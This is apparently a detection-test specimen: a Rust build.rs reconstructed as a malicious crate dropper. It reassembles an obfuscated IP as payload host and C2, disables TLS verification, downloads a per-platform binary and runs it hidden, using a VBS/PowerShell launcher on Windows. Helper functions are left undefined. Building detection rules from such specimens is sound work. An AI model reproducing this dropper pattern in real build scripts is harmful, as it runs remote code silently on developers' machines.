// Synthetic specimen — proc-macro1 1.0.107 build.rs reconstructed from public
// reporting (crates.io / Rust Security Response WG, StepSecurity, Aikido,
// safedep, 2026-08-20). Not the live crate; a text reconstruction of the
// distinctive dropper shape to exercise all three rules.

use std::path::PathBuf;
use std::process::{Command, Stdio};

// Payload host and C2 reassembled from base64 fragments at build time.
// SRC decodes to https://23.254.165.112:9089/ , END to 23.254.165.112:443
const SRC_URL_PARTS: &[&str] = &["aHR0cHM6Ly8=", "MjMuMjU0Lg==", "MTY1Lg==", "MTEyOg==", "OTA4OS8="];
const END_URL_PARTS: &[&str] = &["MjMuMjU0Lg==", "MTY1Lg==", "MTEyOg==", "NDQz"];

fn end_url() -> String {
    // "23.254.165.112:443"
    END_URL_PARTS.iter().map(|p| decode_b64(p)).collect()
}

// TLS verification disabled: every check returns success unconditionally.
struct AcceptAll;
impl rustls::client::danger::ServerCertVerifier for AcceptAll {
    fn verify_server_cert(&self /* .. */) -> Result<ServerCertVerified, rustls::Error> {
        Ok(ServerCertVerified::assertion())
    }
    // verify_tls12_signature / verify_tls13_signature also return assertion()
}

fn payload_name() -> &'static str {
    match (std::env::consts::OS, std::env::consts::ARCH) {
        ("linux", "x86_64") => "rust-crate_0.1.0",
        ("windows", "x86_64") => "rust-crate_0.2.0",
        ("macos", "x86_64") => "rust-crate_0.3.0",
        ("macos", "aarch64") => "rust-crate_0.4.0",
        (_, _) => panic!("unsupported platform"),
    }
}

fn run_unix_payload(bytes: Vec<u8>) {
    let path = PathBuf::from("/tmp/rust-setup");
    std::fs::write(&path, &bytes).expect("failed to write payload");
    Command::new("chmod").args(["+x", path.to_str().unwrap()]).status().unwrap();
    Command::new(&path)
        .arg(end_url())
        .stdin(Stdio::null())
        .stdout(Stdio::null())
        .stderr(Stdio::null())
        .spawn()
        .expect("failed to spawn payload");
}

fn run_windows_payload(bytes: Vec<u8>) {
    let temp = std::env::var("TEMP").unwrap();
    let script_path = format!("{}\\rust-setup.ps1", temp);
    let launcher = format!("{}\\rust-setup-launch.vbs", temp);
    std::fs::write(&script_path, &bytes).unwrap();
    let vbs = format!(
        r#"CreateObject("Wscript.Shell").Run "powershell.exe -NoProfile -File {} {}", 0, False"#,
        script_path, end_url()
    );
    std::fs::write(&launcher, vbs).unwrap();
    let child = Command::new("wscript.exe")
        .args(["//B", "//Nologo", &launcher])
        .creation_flags(CREATE_NO_WINDOW)
        .spawn()
        .expect("failed to spawn launcher");
    std::mem::forget(child); // leak handle to escape Cargo's job object
}

fn main() {
    let bytes = fetch_over_tls(&reassemble(SRC_URL_PARTS), payload_name());
    if cfg!(windows) { run_windows_payload(bytes) } else { run_unix_payload(bytes) }
}
